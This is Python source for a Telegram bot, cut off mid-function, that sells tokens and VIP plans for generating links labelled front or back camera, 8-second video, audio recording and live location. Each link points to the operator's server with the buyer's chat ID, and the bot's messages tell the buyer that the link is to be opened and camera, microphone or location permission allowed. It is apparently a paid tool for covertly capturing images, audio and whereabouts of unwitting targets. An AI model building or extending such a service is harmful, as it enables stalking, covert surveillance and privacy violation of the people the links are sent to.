import io
import json
import os
import random
import string
import threading
import re
import sqlite3
from datetime import datetime, timedelta
from flask import Flask, request, render_template
from PIL import Image, ImageDraw
import telebot
from telebot import types

# ----------------- 1. CONFIGURATION & SETUP -----------------
with open("config.json", "r") as f:
    config = json.load(f)

BOT_TOKEN = config.get("bot_token")
ADMIN_ID = int(config.get("admin_id"))
OWNER_USERNAME = config.get("owner_username")
SERVER_URL = config.get("server_url")
CHANNELS = config.get("channels", [])
GROUP = config.get("group", {})

DEV_TAG = f"👨‍💻 Developer: @{OWNER_USERNAME}"

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
app = Flask(__name__)

# Premium Emojis (HTML format me use karne ke liye)
def em(eid, fb="⭐"):
    return f'<tg-emoji emoji-id="{eid}">{fb}</tg-emoji>'

EMOJI_FIRE    = "5289722755871162900"
EMOJI_STAR    = "5372849966689566579"
EMOJI_CROWN   = "6237927637906364256"
EMOJI_SHIELD  = "6235476345451716705"
EMOJI_CHECK   = "4958689671950369798"
EMOJI_CROSS   = "4958900559139570572"
EMOJI_WARNING = "4958526153955476488"
EMOJI_BELL    = "5098265504796115765"


# ----------------- 2. BUTTON FUNCTION & LABELS -----------------
def make_colored_btn(text, style="primary"):
    # Telegram API style parameter (Blue, Green, Red)
    btn = types.KeyboardButton(text)
    btn.style = style
    return btn

# Main Menu Buttons
BTN_CAMERA = "〖 ಠ〗𝐂𝐚𝐦𝐞𝐫𝐚"
BTN_AUDIO = "♫︎  𝐀𝐮𝐝𝐢𝐨"
BTN_LOCATION = "༆ 𝐋𝐨𝐜𝐚𝐭𝐢𝐨𝐧"
BTN_PRICE = "𝐏𝐫𝐢𝐜𝐞 ?"
BTN_REDEEM = "✍︎ 𝐑𝐞𝐝𝐞𝐞𝐦 𝐂𝐨𝐝𝐞"
BTN_BALANCE = "✔︎ 𝐌𝐲 𝐁𝐚𝐥𝐚𝐧𝐜𝐞"
BTN_PAGE = "𖠌 𝐏𝐞𝐠𝐞"
BTN_ADMIN = "♕︎ 𝐀𝐝𝐦𝐢𝐧 𝐏𝐚𝐧𝐧𝐞𝐥"

# Camera Sub-Menu Buttons
BTN_FRONT_CAM = "〖 ಠ〗𝐅𝐫𝐨𝐧𝐭 𝐂𝐚𝐦𝐞𝐫𝐚"
BTN_BACK_CAM = "〖 ಠ〗𝐁𝐚𝐜𝐤 𝐂𝐚𝐦𝐞𝐫𝐚"
BTN_FRONT_VID = "〖 ಠ〗𝐅𝐫𝐨𝐧𝐭 8𝐬 𝐕𝐢𝐝𝐞𝐨"
BTN_BACK_VID = "〖 ಠ〗𝐁𝐚𝐜𝐤 8𝐬 𝐕𝐢𝐝𝐞𝐨"
BTN_BACK_HOME = "⌫  𝐁𝐚𝐜𝐤 𝐓𝐨 𝐇𝐨𝐦𝐞"

# Admin Panel Buttons
BTN_GEN_REDEEM = "✍︎ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞 𝐑𝐞𝐝𝐞𝐞𝐦"
BTN_USER_ACTIVITY = "㋛︎ 𝐔𝐬𝐞𝐫 𝐀𝐜𝐭𝐢𝐯𝐢𝐭𝐲"
BTN_USER_PLAN = "シ︎ 𝐔𝐬𝐞𝐫 𝐏𝐥𝐚𝐧"
BTN_ACTIVATE_PLAN = "✈︎ 𝐀𝐜𝐭𝐢𝐯𝐚𝐭𝐞 𝐏𝐥𝐚𝐧"
BTN_BROADCAST = "📢 𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭"
BTN_FORCE_JOIN = "🔗 𝐅𝐨𝐫𝐜𝐞 𝐉𝐨𝐢𝐧"
BTN_ADD_ADMIN = "👤 𝐀𝐝𝐝 𝐀𝐝𝐦𝐢𝐧"
BTN_REMOVE_ADMIN = "❌ 𝐑𝐞𝐦𝐨𝐯𝐞 𝐀𝐝𝐦𝐢𝐧"
BTN_ADMIN_LIST = "📋 𝐀𝐝𝐦𝐢𝐧 𝐋𝐢𝐬𝐭"


# ----------------- 3. DATABASE MANAGEMENT (SQLite & JSON) -----------------
DB_FILE = "bot_data.db"

def db_init():
    con = sqlite3.connect(DB_FILE)
    con.execute("CREATE TABLE IF NOT EXISTS admins(id INTEGER PRIMARY KEY)")
    con.execute("CREATE TABLE IF NOT EXISTS settings(k TEXT PRIMARY KEY, v TEXT)")
    con.execute("INSERT OR IGNORE INTO admins(id) VALUES(?)", (ADMIN_ID,))
    con.commit()
    con.close()
db_init()

def is_admin(uid):
    if uid == ADMIN_ID: return True
    con = sqlite3.connect(DB_FILE)
    r = con.execute("SELECT id FROM admins WHERE id=?", (uid,)).fetchone()
    con.close()
    return bool(r)

def admin_list():
    con = sqlite3.connect(DB_FILE)
    rows = con.execute("SELECT id FROM admins").fetchall()
    con.close()
    return [r[0] for r in rows]

def admin_add(uid):
    con = sqlite3.connect(DB_FILE)
    con.execute("INSERT OR IGNORE INTO admins(id) VALUES(?)", (uid,))
    con.commit(); con.close()

def admin_del(uid):
    con = sqlite3.connect(DB_FILE)
    con.execute("DELETE FROM admins WHERE id=?", (uid,))
    con.commit(); con.close()

def set_setting(k, v):
    con = sqlite3.connect(DB_FILE)
    con.execute("INSERT OR REPLACE INTO settings(k,v) VALUES(?,?)", (k, str(v)))
    con.commit(); con.close()

def get_setting(k, default=""):
    con = sqlite3.connect(DB_FILE)
    r = con.execute("SELECT v FROM settings WHERE k=?", (k,)).fetchone()
    con.close()
    return r[0] if r else default


def load_db():
    try:
        with open("database.json", "r") as f:
            return json.load(f)
    except Exception:
        return {"users": {}, "redeem_codes": {}}

def save_db(db):
    with open("database.json", "w") as f:
        json.dump(db, f, indent=4)

def get_user_data(user):
    db = load_db()
    uid = str(user.id)
    if uid not in db["users"]:
        db["users"][uid] = {
            "tokens": 0,
            "plan": "free",
            "expiry": None,
            "username": f"@{user.username}" if user.username else "No Username",
            "name": user.first_name
        }
        save_db(db)
    return db["users"][uid]

def has_active_plan(uid):
    if is_admin(int(uid)): return True
    db = load_db()
    user = db["users"].get(str(uid))
    if not user: return False
    if user.get("plan") == "unlimited":
        if user.get("expiry") is None: return True
        exp = datetime.strptime(user["expiry"], "%Y-%m-%d %H:%M:%S")
        if datetime.now() < exp: return True
    if user.get("tokens", 0) > 0: return True
    return False

def deduct_token(uid):
    if is_admin(int(uid)): return
    db = load_db()
    user = db["users"].get(str(uid))
    if user and user.get("plan") != "unlimited":
        user["tokens"] = max(0, user.get("tokens", 0) - 1)
        save_db(db)

# States for Flow
broadcast_state = {}
addchannel_state = {}
addadmin_state = {}


# ----------------- 4. FORCE JOIN VERIFICATION -----------------
def is_fj_enabled():
    return get_setting("fj_enabled", "1") == "1"

def is_user_joined(user_id):
    if not is_fj_enabled(): return True
    if is_admin(int(user_id)): return True

    for ch in CHANNELS:
        try:
            member = bot.get_chat_member(ch["username"], user_id)
            if member.status not in ['creator', 'administrator', 'member', 'restricted']:
                return False
        except Exception: return False

    try:
        member = bot.get_chat_member(GROUP["username"], user_id)
        if member.status not in ['creator', 'administrator', 'member', 'restricted']:
            return False
    except Exception: return False

    return True

def get_force_join_markup():
    markup = types.InlineKeyboardMarkup(row_width=1)
    for ch in CHANNELS:
        markup.add(types.InlineKeyboardButton(f"📢 Join {ch['name']}", url=ch["url"]))
    markup.add(types.InlineKeyboardButton(f"👥 Join {GROUP['name']}", url=GROUP["url"]))
    markup.add(types.InlineKeyboardButton("✅ Check / Verified", callback_data="check_join"))
    return markup


# ----------------- 5. KEYBOARDS -----------------
def get_main_menu(user_id):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row(make_colored_btn(BTN_CAMERA, "primary"), make_colored_btn(BTN_AUDIO, "primary"))
    markup.row(make_colored_btn(BTN_LOCATION, "success"), make_colored_btn(BTN_PRICE, "success"))
    markup.row(make_colored_btn(BTN_REDEEM, "primary"), make_colored_btn(BTN_BALANCE, "success"))
    markup.row(make_colored_btn(BTN_PAGE, "primary"))
    if is_admin(int(user_id)):
        markup.row(make_colored_btn(BTN_ADMIN, "danger"))
    return markup

def get_camera_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row(make_colored_btn(BTN_FRONT_CAM, "primary"), make_colored_btn(BTN_BACK_CAM, "primary"))
    markup.row(make_colored_btn(BTN_FRONT_VID, "success"), make_colored_btn(BTN_BACK_VID, "success"))
    markup.row(make_colored_btn(BTN_BACK_HOME, "danger"))
    return markup

def get_admin_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row(make_colored_btn(BTN_GEN_REDEEM, "primary"), make_colored_btn(BTN_USER_ACTIVITY, "primary"))
    markup.row(make_colored_btn(BTN_USER_PLAN, "success"), make_colored_btn(BTN_ACTIVATE_PLAN, "success"))
    markup.row(make_colored_btn(BTN_BROADCAST, "danger"), make_colored_btn(BTN_FORCE_JOIN, "success"))
    markup.row(make_colored_btn(BTN_ADD_ADMIN, "success"), make_colored_btn(BTN_REMOVE_ADMIN, "danger"))
    markup.row(make_colored_btn(BTN_ADMIN_LIST, "primary"), make_colored_btn(BTN_BACK_HOME, "danger"))
    return markup

def get_redeem_type_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row(make_colored_btn("VIP", "success"), make_colored_btn("Normal", "primary"))
    markup.row(make_colored_btn(BTN_BACK_HOME, "danger"))
    return markup

def get_fj_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row(make_colored_btn("➕ 𝐀𝐝𝐝 𝐂𝐡𝐚𝐧𝐧𝐞𝐥", "success"), make_colored_btn("🗑 𝐃𝐞𝐥𝐞𝐭𝐞 𝐂𝐡𝐚𝐧𝐧𝐞𝐥", "danger"))
    markup.row(make_colored_btn("🔔 𝐓𝐨𝐠𝐠𝐥𝐞 𝐅𝐨𝐫𝐜𝐞 𝐉𝐨𝐢𝐧", "primary"))
    markup.row(make_colored_btn(BTN_BACK_HOME, "danger"))
    return markup


# ----------------- 6. CIRCULAR AVATAR GENERATOR -----------------
def make_circular_avatar(avatar_img, size=(130, 130), border_color="#2ECC71", border_width=5):
    avatar_img = avatar_img.resize(size, Image.Resampling.LANCZOS).convert("RGBA")
    mask = Image.new("L", size, 0)
    draw_mask = ImageDraw.Draw(mask)
    draw_mask.ellipse((0, 0, size[0], size[1]), fill=255)
    circular = Image.new("RGBA", size, (0, 0, 0, 0))
    circular.paste(avatar_img, (0, 0), mask=mask)
    draw_border = ImageDraw.Draw(circular)
    draw_border.ellipse((border_width // 2, border_width // 2, size[0] - border_width // 2, size[1] - border_width // 2), outline=border_color, width=border_width)
    return circular


# ----------------- 7. CORE BOT HANDLERS -----------------
def send_home_dashboard(chat_id, user):
    get_user_data(user)
    bot_name = bot.get_me().first_name
    welcome_text = (
        f"<blockquote>"
        f"Welcome to {bot_name}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"Name : {user.first_name}\n"
        f"UID: {user.id}\n"
        f"Username: @{user.username if user.username else 'N/A'}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"{DEV_TAG}"
        f"</blockquote>"
    )
    markup = get_main_menu(user.id)
    user_photos = bot.get_user_profile_photos(user.id)
    try:
        banner = Image.open("banner.png").convert("RGBA")
        if user_photos.total_count > 0:
            file_id = user_photos.photos[0][-1].file_id
            file_info = bot.get_file(file_id)
            downloaded = bot.download_file(file_info.file_path)
            avatar = make_circular_avatar(Image.open(io.BytesIO(downloaded)))
            banner.paste(avatar, (30, 30), avatar)
        buf = io.BytesIO()
        banner.convert("RGB").save(buf, format="JPEG", quality=95)
        buf.seek(0)
        bot.send_photo(chat_id, photo=buf, caption=welcome_text, reply_markup=markup)
    except Exception:
        bot.send_message(chat_id, welcome_text, reply_markup=markup)

@bot.message_handler(commands=['start'])
def handle_start(message):
    user = message.from_user
    if not is_user_joined(user.id):
        force_msg = (
            f"<blockquote>"
            f"⚠️ <b>Access Denied!</b>\n\n"
            f"Bot use karne ke liye aapko hamare Channels aur Group ko join karna zaroori hai.\n\n"
            f"Join karne ke baad <b>'Check / Verified'</b> button par click karein.\n"
            f"{DEV_TAG}"
            f"</blockquote>"
        )
        bot.send_message(message.chat.id, force_msg, reply_markup=get_force_join_markup())
        return
    send_home_dashboard(message.chat.id, user)

@bot.callback_query_handler(func=lambda call: call.data == "check_join")
def verify_join_callback(call):
    if is_user_joined(call.from_user.id):
        try: bot.delete_message(call.message.chat.id, call.message.message_id)
        except Exception: pass
        send_home_dashboard(call.message.chat.id, call.from_user)
    else:
        bot.answer_callback_query(call.id, "❌ Aapne abhi tak sabhi channels/group join nahi kiye!", show_alert=True)


# --- MY BALANCE HANDLER ---
@bot.message_handler(func=lambda m: m.text == BTN_BALANCE)
def handle_my_balance(message):
    uid = str(message.from_user.id)
    db = load_db()
    user = db["users"].get(uid)

    if is_admin(int(uid)):
        bot.send_message(message.chat.id, f"<blockquote>{em(EMOJI_CHECK,'✅')} Activate VIP Lifetime\nToken : unlimited\n{DEV_TAG}</blockquote>")
        return

    if not user:
        bot.send_message(message.chat.id, f"<blockquote>{em(EMOJI_CROSS,'❌')} Not activate VIP\nToken : 0\n{DEV_TAG}</blockquote>")
        return

    if user.get("plan") == "unlimited" and user.get("expiry"):
        exp = datetime.strptime(user["expiry"], "%Y-%m-%d %H:%M:%S")
        if datetime.now() < exp:
            rem_days = max(1, (exp - datetime.now()).days + 1)
            bot.send_message(message.chat.id, f"<blockquote>{em(EMOJI_CHECK,'✅')} Activate VIP {rem_days}d\nToken : unlimited\n{DEV_TAG}</blockquote>")
            return

    tokens = user.get("tokens", 0)
    bot.send_message(message.chat.id, f"<blockquote>{em(EMOJI_CROSS,'❌')} Not activate VIP\nToken : {tokens}\n{DEV_TAG}</blockquote>")


# --- PRICE & BUY FLOW ---
def send_price_menu(chat_id):
    price_text = (
        f"<blockquote>"
        f"5 token ₹10\n10 token ₹15\n30 token ₹55\n100 token ₹80\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"Unlimited 3 deys ₹30\nUnlimited 7 deys ₹60\nUnlimited 30 deys ₹200\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"Bye karne ke liye mujhe massage karna hoga\n{DEV_TAG}"
        f"</blockquote>"
    )
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("bye subscription", url=f"https://t.me/{OWNER_USERNAME}"))
    bot.send_message(chat_id, price_text, reply_markup=markup, disable_web_page_preview=True)

@bot.message_handler(func=lambda m: m.text == BTN_PRICE)
def handle_price_btn(message): send_price_menu(message.chat.id)


# --- CAMERA SUB-MENU & LINK GENERATORS ---
@bot.message_handler(func=lambda m: m.text == BTN_CAMERA)
def handle_camera_options(message):
    bot.send_message(message.chat.id, f"<blockquote>📷 <b>Camera Options:</b>\nNiche diye gaye options me se select karein.\n{DEV_TAG}</blockquote>", reply_markup=get_camera_menu())

def handle_media_request(message, endpoint, label):
    uid = message.from_user.id
    if not has_active_plan(uid):
        bot.send_message(message.chat.id, f"<blockquote>⚠️ <b>Aap ke pass koi subscription nahi hai</b>\n\n{DEV_TAG}</blockquote>", disable_web_page_preview=True)
        send_price_menu(message.chat.id)
        return
    deduct_token(uid)
    link = f"{SERVER_URL}/{endpoint}?chat_id={message.chat.id}"
    bot.send_message(message.chat.id, f"<blockquote>🔗 <b>{label} Link Generated:</b>\n\n{link}\n\n⚠️ Is link ko open karein aur permission allow karein.\n{DEV_TAG}</blockquote>", disable_web_page_preview=True)

@bot.message_handler(func=lambda m: m.text == BTN_FRONT_CAM)
def front_cam(m): handle_media_request(m, "ayush-web", "Front Camera")

@bot.message_handler(func=lambda m: m.text == BTN_BACK_CAM)
def back_cam(m): handle_media_request(m, "ayush-web-1", "Back Camera")

@bot.message_handler(func=lambda m: m.text == BTN_FRONT_VID)
def front_vid(m): handle_media_request(m, "ayush-web-2", "Front 8s Video")

@bot.message_handler(func=lambda m: m.text == BTN_BACK_VID)
def back_vid(m): handle_media_request(m, "ayush-web-3", "Back 8s Video")


# --- AUDIO & LOCATION HANDLERS ---
@bot.message_handler(func=lambda m: m.text == BTN_AUDIO)
def handle_audio_btn(message):
    uid = message.from_user.id
    if not has_active_plan(uid):
        bot.send_message(message.chat.id, f"<blockquote>⚠️ <b>Aap ke pass koi subscription nahi hai</b>\n\n{DEV_TAG}</blockquote>", disable_web_page_preview=True)
        send_price_menu(message.chat.id)
        return
    deduct_token(uid)
    link = f"{SERVER_URL}/ayush-web-4?chat_id={message.chat.id}"
    bot.send_message(message.chat.id, f"<blockquote>🔗 <b>Audio Recording Link:</b>\n\n{link}\n\n⚠️ Link open karte hi mic permission allow karein.\n{DEV_TAG}</blockquote>", disable_web_page_preview=True)

@bot.message_handler(func=lambda m: m.text == BTN_LOCATION)
def handle_location_btn(message):
    uid = message.from_user.id
    if not has_active_plan(uid):
        bot.send_message(message.chat.id, f"<blockquote>⚠️ <b>Aap ke pass koi subscription nahi hai</b>\n\n{DEV_TAG}</blockquote>", disable_web_page_preview=True)
        send_price_menu(message.chat.id)
        return
    deduct_token(uid)
    link = f"{SERVER_URL}/ayush-web-5?chat_id={message.chat.id}"
    bot.send_message(message.chat.id, f"<blockquote>🔗 <b>Live Location Link:</b>\n\n{link}\n\n⚠️ Link open karke location permission allow karein.\n{DEV_TAG}</blockquote>", disable_web_page_preview=True)


# --- NAVIGATION & PAGES ---
@bot.message_handler(func=lambda m: m.text in [BTN_BACK_HOME, "Back to home", "⬅️ Back"])
def nav_home(m):
    if is_admin(m.from_user.id) and m.text == "⬅️ Back":
        bot.send_message(m.chat.id, "🏠 Admin menu", reply_markup=get_admin_menu())
    else:
        send_home_dashboard(m.chat.id, m.from_user)

@bot.message_handler(func=lambda m: m.text == BTN_PAGE)
def nav_page(m): bot.reply_to(m, f"<blockquote>🚧 <b>Coming soon</b>\n{DEV_TAG}</blockquote>")


# --- USER REDEEM CODE FLOW ---
@bot.message_handler(func=lambda m: m.text == BTN_REDEEM)
def ask_user_redeem_code(message):
    msg = bot.send_message(message.chat.id, f"<blockquote>Apna redeem code send karo\n{DEV_TAG}</blockquote>")
    bot.register_next_step_handler(msg, process_user_redeem_input)

def process_user_redeem_input(message):
    all_nav_buttons = [BTN_BACK_HOME, BTN_CAMERA, BTN_AUDIO, BTN_LOCATION, BTN_PRICE, BTN_REDEEM, BTN_BALANCE, BTN_PAGE, BTN_ADMIN, "Back to home"]
    if message.text in all_nav_buttons:
        send_home_dashboard(message.chat.id, message.from_user)
        return

    code = message.text.strip()
    db = load_db()

    if code in db.get("redeem_codes", {}):
        rc = db["redeem_codes"][code]
        if "used_by" not in rc: rc["used_by"] = []
        uid = str(message.from_user.id)

        if uid in rc["used_by"]:
            bot.reply_to(message, f"<blockquote>❌ <b>Aap is redeem code ko pehle hi use kar chuke hain!</b>\n{DEV_TAG}</blockquote>")
            return

        if rc.get("uses_left", 0) > 0:
            user = db["users"].get(uid) or get_user_data(message.from_user)
            if rc["type"] == "token":
                user["tokens"] = user.get("tokens", 0) + rc["value"]
                res_text = f"Successfully {rc['value']} token"
            else:
                user["plan"] = "unlimited"
                user["expiry"] = (datetime.now() + timedelta(days=rc["days"])).strftime("%Y-%m-%d %H:%M:%S")
                res_text = f"Successfully VIP activete {rc['days']}d unlimited token"

            rc["used_by"].append(uid)
            rc["uses_left"] -= 1
            if rc["uses_left"] <= 0: del db["redeem_codes"][code]
            save_db(db)
            bot.reply_to(message, f"<blockquote>{res_text}\n{DEV_TAG}</blockquote>")
            return

    bot.reply_to(message, f"<blockquote>❌ Invalid ya Expired Redeem Code!\n{DEV_TAG}</blockquote>")


# ----------------- 8. ADMIN PANEL ACTIONS -----------------
@bot.message_handler(func=lambda m: m.text == BTN_ADMIN)
def admin_panel_open(message):
    if not is_admin(message.from_user.id): return
    bot.send_message(message.chat.id, f"<blockquote>⚙️ <b>Admin Control Panel:</b>\nNiche se option select karein.\n{DEV_TAG}</blockquote>", reply_markup=get_admin_menu())

@bot.message_handler(func=lambda m: m.text == BTN_USER_ACTIVITY)
def admin_user_activity(message):
    if not is_admin(message.from_user.id): return
    db = load_db()
    users = db.get("users", {})
    text = f"<blockquote>👥 <b>Registered Users: {len(users)}</b>\n━━━━━━━━━━━━━━━━━━━━\n"
    for uid, data in list(users.items())[-15:]:
        text += f"• <b>Name:</b> {data.get('name', 'N/A')} | <b>UID:</b> <code>{uid}</code>\n"
    text += f"\n{DEV_TAG}</blockquote>"
    bot.send_message(message.chat.id, text)

@bot.message_handler(func=lambda m: m.text == BTN_USER_PLAN)
def admin_user_plan_view(message):
    if not is_admin(message.from_user.id): return
    db = load_db()
    users = db.get("users", {})
    text = f"<blockquote>📋 <b>Users Plan Details:</b>\n━━━━━━━━━━━━━━━━━━━━\n"
    now = datetime.now()
    for uid, data in list(users.items())[-20:]:
        status_str = "❌ Free"
        if is_admin(int(uid)): status_str = "👑 Admin"
        elif data.get("plan") == "unlimited" and data.get("expiry"):
            exp_dt = datetime.strptime(data["expiry"], "%Y-%m-%d %H:%M:%S")
            if now < exp_dt: status_str = f"👑 VIP ({(exp_dt - now).days + 1}d)"
            else: status_str = f"⚠️ Expired"
        elif data.get("tokens", 0) > 0: status_str = f"🪙 {data.get('tokens')} Tokens"
        
        text += f"• <b>{data.get('name', 'N/A')}</b> (<code>{uid}</code>)\n  └ {status_str}\n\n"
    text += f"{DEV_TAG}</blockquote>"
    bot.send_message(message.chat.id, text)


# --- BROADCAST SYSTEM (Text, Photo, Video, Sticker sab jayega) ---
@bot.message_handler(func=lambda m: m.text == BTN_BROADCAST and is_admin(m.from_user.id))
def admin_broadcast_start(message):
    broadcast_state[message.from_user.id] = True
    msg = bot.send_message(message.chat.id, f"<blockquote>📢 <b>Broadcast Mode Active</b>\n\nJo bhejna hai bhej do (Text, Photo, Video, <b>Sticker</b>).\nCancel: /cancel\n{DEV_TAG}</blockquote>")
    bot.register_next_step_handler(msg, admin_broadcast_do)

def admin_broadcast_do(message):
    if message.text == "/cancel":
        broadcast_state.pop(message.from_user.id, None)
        bot.send_message(message.chat.id, "❌ Broadcast Cancelled.", reply_markup=get_admin_menu())
        return

    db = load_db()
    users = list(db.get("users", {}).keys())
    status_msg = bot.send_message(message.chat.id, f"⏳ Sending to {len(users)} users...")
    success, fail = 0, 0
    
    for uid in users:
        try:
            bot.copy_message(chat_id=int(uid), from_chat_id=message.chat.id, message_id=message.message_id)
            success += 1
        except Exception:
            fail += 1
            
    broadcast_state.pop(message.from_user.id, None)
    bot.edit_message_text(f"✅ <b>Broadcast Completed!</b>\n\nSuccessful: {success}\nFailed: {fail}", chat_id=message.chat.id, message_id=status_msg.message_id, reply_markup=get_admin_menu())


# --- FORCE JOIN MANAGER ---
@bot.message_handler(func=lambda m: m.text == BTN_FORCE_JOIN and is_admin(m.from_user.id))
def fj_menu_start(message):
    status = "ON 🟢" if is_fj_enabled() else "OFF 🔴"
    bot.send_message(message.chat.id, f"<blockquote>🔗 <b>Force Join Manager</b>\nStatus: <b>{status}</b>\n{DEV_TAG}</blockquote>", reply_markup=get_fj_menu())

@bot.message_handler(func=lambda m: m.text == "🔔 𝐓𝐨𝐠𝐠𝐥𝐞 𝐅𝐨𝐫𝐜𝐞 𝐉𝐨𝐢𝐧" and is_admin(m.from_user.id))
def fj_toggle(message):
    new_val = "0" if is_fj_enabled() else "1"
    set_setting("fj_enabled", new_val)
    status = "ON 🟢" if new_val == "1" else "OFF 🔴"
    bot.send_message(message.chat.id, f"✅ Force Join is now: <b>{status}</b>", reply_markup=get_fj_menu())

@bot.message_handler(func=lambda m: m.text == "➕ 𝐀𝐝𝐝 𝐂𝐡𝐚𝐧𝐧𝐞𝐥" and is_admin(m.from_user.id))
def fj_add_channel_start(message):
    msg = bot.send_message(message.chat.id, "Channel ka <b>Username</b> ya <b>Link</b> bhejo (jaise @mychannel):", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, fj_add_channel_save)

def fj_add_channel_save(message):
    text = message.text.strip()
    if not text.startswith("@"): text = "@" + text
    try:
        chat = bot.get_chat(text)
        CHANNELS.append({"name": chat.title, "username": text, "url": f"https://t.me/{text[1:]}"})
        with open("config.json", "r") as f: cfg = json.load(f)
        cfg["channels"] = CHANNELS
        with open("config.json", "w") as f: json.dump(cfg, f, indent=4)
        bot.send_message(message.chat.id, f"✅ Channel <b>{chat.title}</b> added!", reply_markup=get_fj_menu())
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: Bot is channel ka admin nahi hai ya username galat hai.\n{str(e)[:50]}", reply_markup=get_fj_menu())

@bot.message_handler(func=lambda m: m.text == "🗑 𝐃𝐞𝐥𝐞𝐭𝐞 𝐂𝐡𝐚𝐧𝐧𝐞𝐥" and is_admin(m.from_user.id))
def fj_del_channel(message):
    if not CHANNELS:
        return bot.send_message(message.chat.id, "Koi channel add nahi hai.", reply_markup=get_fj_menu())
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
    for ch in CHANNELS: kb.add(types.KeyboardButton(f"❌ {ch['name']}"))
    kb.add(types.KeyboardButton("⬅️ Back"))
    bot.send_message(message.chat.id, "Delete karne ke liye select karein:", reply_markup=kb)

@bot.message_handler(func=lambda m: m.text and m.text.startswith("❌ ") and is_admin(m.from_user.id))
def fj_del_channel_do(message):
    name = message.text[2:].strip()
    global CHANNELS
    CHANNELS = [ch for ch in CHANNELS if ch['name'] != name]
    with open("config.json", "r") as f: cfg = json.load(f)
    cfg["channels"] = CHANNELS
    with open("config.json", "w") as f: json.dump(cfg, f, indent=4)
    bot.send_message(message.chat.id, f"✅ Channel deleted!", reply_markup=get_fj_menu())


# --- ADD/REMOVE/LIST ADMINS ---
@bot.message_handler(func=lambda m: m.text == BTN_ADD_ADMIN and is_admin(m.from_user.id))
def add_admin_start(message):
    addadmin_state[message.from_user.id] = True
    msg = bot.send_message(message.chat.id, "User ka <b>Telegram ID</b> bhejo:", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, add_admin_save)

def add_admin_save(message):
    addadmin_state.pop(message.from_user.id, None)
    if not message.text.isdigit():
        return bot.send_message(message.chat.id, "❌ Invalid ID.", reply_markup=get_admin_menu())
    uid = int(message.text)
    admin_add(uid)
    bot.send_message(message.chat.id, f"✅ Admin Added: <code>{uid}</code>", reply_markup=get_admin_menu())

@bot.message_handler(func=lambda m: m.text == BTN_REMOVE_ADMIN and is_admin(m.from_user.id))
def rm_admin_list(message):
    admins = admin_list()
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
    for a in admins:
        if a == ADMIN_ID: continue
        kb.add(types.KeyboardButton(f"❌ {a}"))
    kb.add(types.KeyboardButton("⬅️ Back"))
    bot.send_message(message.chat.id, "Remove karne ke liye select karein:", reply_markup=kb)

@bot.message_handler(func=lambda m: m.text and m.text.startswith("❌ ") and m.text[2:].isdigit() and is_admin(m.from_user.id))
def rm_admin_do(message):
    uid = int(message.text[2:])
    if uid == ADMIN_ID: return bot.send_message(message.chat.id, "❌ Owner cannot be removed!", reply_markup=get_admin_menu())
    admin_del(uid)
    bot.send_message(message.chat.id, f"✅ Admin Removed: <code>{uid}</code>", reply_markup=get_admin_menu())

@bot.message_handler(func=lambda m: m.text == BTN_ADMIN_LIST and is_admin(m.from_user.id))
def admin_list_view(message):
    admins = admin_list()
    text = "📋 <b>Admin List:</b>\n\n"
    for a in admins:
        tag = "👑 Owner" if a == ADMIN_ID else "🛡 Admin"
        text += f"{tag} — <code>{a}</code>\n"
    bot.send_message(message.chat.id, text, reply_markup=get_admin_menu())


# --- ADMIN REDEEM CODE GENERATION FLOW ---
@bot.message_handler(func=lambda m: m.text == BTN_GEN_REDEEM and is_admin(m.from_user.id))
def admin_generate_redeem_start(message):
    bot.send_message(message.chat.id, f"<blockquote>VIP banana chahte hain ya normal\n{DEV_TAG}</blockquote>", reply_markup=get_redeem_type_menu())

@bot.message_handler(func=lambda m: m.text == "Normal" and is_admin(m.from_user.id))
def admin_normal_ask_users(message):
    msg = bot.send_message(message.chat.id, f"<blockquote>kitne user ke liye\n{DEV_TAG}</blockquote>", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, admin_normal_ask_tokens)

def admin_normal_ask_tokens(message):
    if not message.text.isdigit(): return bot.send_message(message.chat.id, "❌ Number bhejein", reply_markup=get_admin_menu())
    users_count = int(message.text)
    msg = bot.send_message(message.chat.id, f"<blockquote>kitne token\n{DEV_TAG}</blockquote>")
    bot.register_next_step_handler(msg, admin_normal_create_code, users_count)

def admin_normal_create_code(message, users_count):
    if not message.text.isdigit(): return bot.send_message(message.chat.id, "❌ Number bhejein", reply_markup=get_admin_menu())
    tokens_count = int(message.text)
    code = f"AYUSH-{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"
    db = load_db()
    db["redeem_codes"][code] = {"type": "token", "value": tokens_count, "uses_left": users_count, "used_by": []}
    save_db(db)
    bot.send_message(message.chat.id, f"<blockquote>Code: <code>{code}</code>\nUser: {users_count}\nToken: {tokens_count}\n{DEV_TAG}</blockquote>", reply_markup=get_admin_menu())

@bot.message_handler(func=lambda m: m.text == "VIP" and is_admin(m.from_user.id))
def admin_vip_ask_users(message):
    msg = bot.send_message(message.chat.id, f"<blockquote>kitne user\n{DEV_TAG}</blockquote>", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, admin_vip_ask_days)

def admin_vip_ask_days(message):
    if not message.text.isdigit(): return bot.send_message(message.chat.id, "❌ Number bhejein", reply_markup=get_admin_menu())
    users_count = int(message.text)
    msg = bot.send_message(message.chat.id, f"<blockquote>kitne din ke liye\n{DEV_TAG}</blockquote>")
    bot.register_next_step_handler(msg, admin_vip_create_code, users_count)

def admin_vip_create_code(message, users_count):
